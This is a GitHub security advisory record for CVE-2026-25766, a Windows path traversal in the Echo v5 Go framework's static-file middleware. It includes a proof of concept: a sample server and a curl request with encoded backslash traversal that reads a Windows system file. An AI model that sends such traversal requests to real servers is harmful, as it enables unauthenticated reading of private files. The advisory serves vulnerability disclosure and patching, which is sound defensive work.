advisory_id: GHSA-pgvm-wxw2-hrv9
datasource_id: github_osv_importer_v2/GHSA-pgvm-wxw2-hrv9
datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/02/GHSA-pgvm-wxw2-hrv9/GHSA-pgvm-wxw2-hrv9.json
aliases:
  - CVE-2026-25766
summary: "Echo has a Windows path traversal via backslash in middleware.Static default filesystem\n\
  ### Summary\nOn Windows, Echo’s `middleware.Static` using the default filesystem allows path\
  \ traversal via backslashes, enabling\nunauthenticated remote file read outside the static\
  \ root.\n\n### Details  \n\n  In `middleware/static.go`, the requested path is unescaped and\
  \ normalized with `path.Clean` (URL semantics).\n  `path.Clean` does **not** treat `\\` as\
  \ a path separator, so `..\\` sequences remain in the cleaned path. The resulting\n  path\
  \ is then passed to `currentFS.Open(...)`. When the filesystem is left at the default (nil),\
  \ Echo uses `defaultFS`\n  which calls `os.Open` (`echo.go:792`). On Windows, `os.Open` treats\
  \ `\\` as a path separator and resolves `..\\`,\n  allowing traversal outside the static root.\n\
  \n  Relevant code:\n  - `middleware/static.go` (path unescape + `path.Clean` + `currentFS.Open`)\n\
  \  - `echo.go` `defaultFS.Open` → `os.Open`\n\n  This is the same class as CVE-2020-36565\
  \ (fixed in v4 by switching to OS-aware cleaning), but in v5 the `path.Clean`\n  + defaultFS\
  \ combination reintroduces the Windows backslash traversal.\n\n\n### PoC\n Windows only.\n\
  \n  **Sample code (main.go):**\n  ```go\n  package main\n\n  import (\n        \"log\"\n \
  \       \"net/http\"\n\n        \"github.com/labstack/echo/v5\"\n        \"github.com/labstack/echo/v5/middleware\"\
  \n  )\n\n  func main() {\n        e := echo.New()\n\n        // Important: use middleware.Static\
  \ with default filesystem (nil)\n        e.Use(middleware.Static(\"public\"))\n\n        e.GET(\"\
  /healthz\", func(c *echo.Context) error {\n                return c.String(http.StatusOK,\
  \ \"ok\")\n        })\n\n        addr := \":1323\"\n        log.Printf(\"listening on %s\"\
  , addr)\n        if err := e.Start(addr); err != nil && err != http.ErrServerClosed {\n  \
  \              log.Fatal(err)\n        }\n  }\n ```\n  Static file:\n\n  public/index.html\n\
  \n  (content can be any HTML)\n\n  **Run:**\n  go run .\n\n  **Verify:**\n\n  curl http://localhost:1323/index.html\n\
  \  curl --path-as-is \"http://localhost:1323/..%5c..%5cWindows%5cSystem32%5cdrivers%5cetc%5chosts\"\
  \n  Expected: 404  \n\n  **Screenshot:**\n<img width=\"884\" height=\"689\" alt=\"image\"\
  \ src=\"https://github.com/user-attachments/assets/acb14d70-2a43-47c1-8927-2f3da491a853\"\
  \ />\n<img width=\"1022\" height=\"162\" alt=\"image\" src=\"https://github.com/user-attachments/assets/f2b92aa2-541e-461d-81a2-8a5907d7a447\"\
  \ />\n\n\n\n  ### Impact\n  Path traversal leading to arbitrary file read outside the static\
  \ root. Any unauthenticated remote user can\n  read local files that the Echo process has\
  \ access to on Windows, if `middleware.Static` is used with the default\n  filesystem."
impacted_packages: []
severities:
  - score: '5.3'
    scoring_system: cvssv3.1
    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N
    published_at: None
    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/02/GHSA-pgvm-wxw2-hrv9/GHSA-pgvm-wxw2-hrv9.json
  - score: MODERATE
    scoring_system: generic_textual
    scoring_elements:
    published_at: None
    url:
weaknesses:
  - CWE-22
references:
  - url: https://github.com/labstack/echo
    reference_type:
    reference_id:
  - url: https://github.com/labstack/echo/commit/b1d443086ea27cf51345ec72a71e9b7e9d9ce5f1
    reference_type:
    reference_id:
  - url: https://github.com/labstack/echo/pull/2891
    reference_type:
    reference_id:
  - url: https://github.com/labstack/echo/security/advisories/GHSA-pgvm-wxw2-hrv9
    reference_type:
    reference_id:
  - url: https://nvd.nist.gov/vuln/detail/CVE-2026-25766
    reference_type:
    reference_id:
  - url: https://pkg.go.dev/vuln/GO-2026-4502
    reference_type:
    reference_id:
